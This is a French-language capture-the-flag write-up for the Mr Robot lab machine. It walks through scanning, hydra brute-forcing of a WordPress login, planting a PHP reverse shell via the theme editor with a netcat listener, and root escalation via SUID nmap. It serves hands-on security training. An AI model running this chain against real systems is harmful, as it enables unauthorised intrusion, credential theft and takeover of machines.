# MrRobot CTF Notes

## Clé 1

### Reconnaissance

```bash
nmap -sC -sV **IP**
```

On voit qu'on a une page HTTP.

Ensuite, on utilise la commande :

```bash
gobuster dir -u http://IP -w /usr/share/wordlists/dirbuster/LIST
```

Après avoir testé plusieurs répertoires, on arrive sur 'robots' :

On voit que la clé est dans le fichier, on a donc juste à accéder à :

```bash
http://IP/key-1-of-3.txt
```

## Clé 2

Ensuite, pour la deuxième clé, lorsque l'on a utilisé la commande dirbuster, on a aussi eu une page **wp-login.php** :

En se connectant, on obtient une page de connexion WordPress.

On va tenter de brute-forcer l'identifiant et le mot de passe avec l'outil hydra :

- Pour l'id :

```bash
hydra -L fsocity.dic -p test **IP** http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username" -t 30
```

On obtient l'id : **Elliot**

- Pour le mot de passe :

```bash
hydra -l Elliot -P fsocity.dic **IP** http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The password you entered for the username" -t 30
```

On obtient le mot de passe : **ER28-0652**

On arrive enfin à se connecter dans le dashboard WP.

Ensuite, après des recherches, on arrive finalement dans l'onglet 'Appearance' puis 'Editor' :

On choisit un fichier PHP et on y upload un reverse shell avec l'IP de la machine depuis laquelle on attaque :

[php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

Ensuite, on accède à la page où est uploadé le reverse shell :

```bash
http://IP/wp-includes/themes/TwentyFifteen/404.php
```

On met le port sur écoute :

```bash
nc -lvnp 1234
```

On obtient accès à la machine.

Maintenant, si on se déplace dans le système, on arrive dans /home et on a 2 fichiers, la deuxième clé et un fichier qui contient un hash MD5.

On décrypte ce fichier puisque l'on ne peut ouvrir la clé.

En allant sur un décrypteur MD5, on obtient :

```bash
robot:abcdefghijklmnopqrstuvwxyz
```

On essaie de se connecter avec `su robot` et le mot de passe, mais on nous refuse l'accès. Il faut être dans un terminal, ainsi on utilise :

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

Après cela, on exécute de nouveau la connexion, ça marche et maintenant on ouvre le fichier 'key-2-of-3.txt' !

## Clé 3

On cherche des failles depuis des binaires SUID puisque `sudo -l` ne fonctionne pas :

```bash
find / -perm -4000 2>/dev/null
```

Maintenant, on voit que /usr/local/bin/nmap est suspect.

On va sur GTFOBins pour voir l'exploitation du binaire :

On voit qu'il suffit de taper ces deux commandes :

```bash
nmap --interactive
```

Puis :

```bash
!sh
```

On a accès en tant que root :

On accède à /root et on peut ouvrir la dernière clé 'key-3-of-3.txt' !

Félicitations, on a terminé !